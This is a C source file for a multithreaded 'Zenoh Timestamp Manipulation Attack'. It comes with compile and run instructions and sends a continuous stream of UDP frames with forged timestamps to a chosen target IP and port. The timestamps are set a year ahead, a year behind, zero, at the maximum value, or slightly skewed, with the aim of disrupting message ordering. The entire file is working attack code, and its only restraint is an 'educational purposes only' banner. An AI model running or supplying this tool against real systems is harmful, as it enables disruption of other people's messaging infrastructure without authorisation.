/*
 * Attack 13: Timestamp Manipulation Attack
 * Sends messages with manipulated timestamps to cause ordering issues
 * 
 * Compile: gcc -o attack13_timestamp attack_13_timestamp_manipulation.c -pthread
 * Run: ./attack13_timestamp <target_ip> <target_port> <threads>
 * 
 * WARNING: FOR EDUCATIONAL PURPOSES ONLY
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <signal.h>
#include <time.h>
#include <stdatomic.h>
#include <sys/time.h>

#define Z_MSG_FRAME 0x00
#define Z_FLAG_RELIABLE 0x20
#define Z_FLAG_EXTENSIONS 0x80
#define Z_EXT_TIMESTAMP 0x01

static volatile int g_running = 1;
static atomic_ullong g_frames_sent = 0;

typedef struct {
    char *target_ip;
    int target_port;
    int thread_id;
} thread_args_t;

void signal_handler(int sig) {
    printf("\n[!] Stopping timestamp manipulation...\n");
    g_running = 0;
}

size_t encode_zint(unsigned char *buf, unsigned long long value) {
    size_t i = 0;
    while (value > 0x7F) {
        buf[i++] = (unsigned char)((value & 0x7F) | 0x80);
        value >>= 7;
    }
    buf[i++] = (unsigned char)(value & 0x7F);
    return i;
}

uint64_t get_timestamp_ntp() {
    struct timeval tv;
    gettimeofday(&tv, NULL);
    
    // Convert to NTP timestamp (simplified)
    uint64_t ntp = ((uint64_t)tv.tv_sec + 2208988800ULL) << 32;
    ntp |= ((uint64_t)tv.tv_usec * 4294967296ULL) / 1000000;
    
    return ntp;
}

void* attack_thread(void *arg) {
    thread_args_t *args = (thread_args_t*)arg;
    int sock;
    struct sockaddr_in target_addr;
    unsigned char buffer[1024];
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        fprintf(stderr, "[-] Thread %d: Socket failed\n", args->thread_id);
        free(args);
        return NULL;
    }
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &target_addr.sin_addr);
    
    printf("[+] Thread %d started (timestamp manipulation)\n", args->thread_id);
    
    unsigned long long seq = args->thread_id * 1000000ULL;
    unsigned long local_count = 0;
    
    while (g_running) {
        int attack_variant = rand() % 5;
        uint64_t timestamp;
        
        switch (attack_variant) {
            case 0: // Future timestamp
                timestamp = get_timestamp_ntp() + (365ULL * 24 * 3600 << 32); // +1 year
                break;
            case 1: // Past timestamp
                timestamp = get_timestamp_ntp() - (365ULL * 24 * 3600 << 32); // -1 year
                break;
            case 2: // Zero timestamp
                timestamp = 0;
                break;
            case 3: // Maximum timestamp
                timestamp = 0xFFFFFFFFFFFFFFFFULL;
                break;
            case 4: // Slightly off timestamp (microsecond manipulation)
                timestamp = get_timestamp_ntp() - 1000;
                break;
        }
        
        size_t offset = 0;
        
        // FRAME header with extensions
        buffer[offset++] = Z_MSG_FRAME | Z_FLAG_RELIABLE | Z_FLAG_EXTENSIONS;
        
        // Sequence number
        offset += encode_zint(buffer + offset, seq++);
        
        // Extension: Timestamp
        buffer[offset++] = Z_EXT_TIMESTAMP;
        buffer[offset++] = 8; // Timestamp length
        
        // Write timestamp (big-endian)
        for (int i = 7; i >= 0; i--) {
            buffer[offset++] = (timestamp >> (i * 8)) & 0xFF;
        }
        
        // Payload
        const char *payload = "TIMESTAMP_MANIPULATED";
        memcpy(buffer + offset, payload, strlen(payload));
        offset += strlen(payload);
        
        sendto(sock, buffer, offset, 0,
              (struct sockaddr*)&target_addr, sizeof(target_addr));
        
        atomic_fetch_add(&g_frames_sent, 1);
        local_count++;
        
        if (local_count % 1000 == 0) {
            printf("[Thread %d] Sent %lu frames (variant %d)\n",
                   args->thread_id, local_count, attack_variant);
        }
        
        usleep(1000);
    }
    
    close(sock);
    printf("[*] Thread %d stopped\n", args->thread_id);
    free(args);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <target_ip> <target_port> <threads>\n", argv[0]);
        return 1;
    }
    
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int num_threads = atoi(argv[3]);
    
    printf("╔════════════════════════════════════════════╗\n");
    printf("║   Zenoh Timestamp Manipulation Attack     ║\n");
    printf("║   WARNING: EDUCATIONAL PURPOSES ONLY       ║\n");
    printf("╚════════════════════════════════════════════╝\n\n");
    printf("[*] Target: %s:%d\n", target_ip, target_port);
    printf("[*] Threads: %d\n", num_threads);
    printf("[*] Timestamp attacks:\n");
    printf("    - Future timestamps (+1 year)\n");
    printf("    - Past timestamps (-1 year)\n");
    printf("    - Zero timestamps\n");
    printf("    - Maximum timestamps\n");
    printf("    - Microsecond manipulation\n\n");
    
    signal(SIGINT, signal_handler);
    srand(time(NULL));
    
    pthread_t threads[num_threads];
    time_t start = time(NULL);
    
    for (int i = 0; i < num_threads; i++) {
        thread_args_t *args = malloc(sizeof(thread_args_t));
        args->target_ip = target_ip;
        args->target_port = target_port;
        args->thread_id = i;
        pthread_create(&threads[i], NULL, attack_thread, args);
    }
    
    printf("[+] Attack started!\n\n");
    
    while (g_running) {
        sleep(5);
        unsigned long long total = atomic_load(&g_frames_sent);
        time_t elapsed = time(NULL) - start;
        printf("[*] Frames sent: %llu | Rate: %.2f fps\n",
               total, elapsed > 0 ? (double)total / elapsed : 0.0);
    }
    
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\n╔════════════════════════════════════════════╗\n");
    printf("║          Final Statistics                  ║\n");
    printf("╠════════════════════════════════════════════╣\n");
    printf("║ Total Frames: %-28llu ║\n", (unsigned long long)atomic_load(&g_frames_sent));
    printf("║ Duration:     %-28ld ║\n", time(NULL) - start);
    printf("╚════════════════════════════════════════════╝\n");
    
    return 0;
}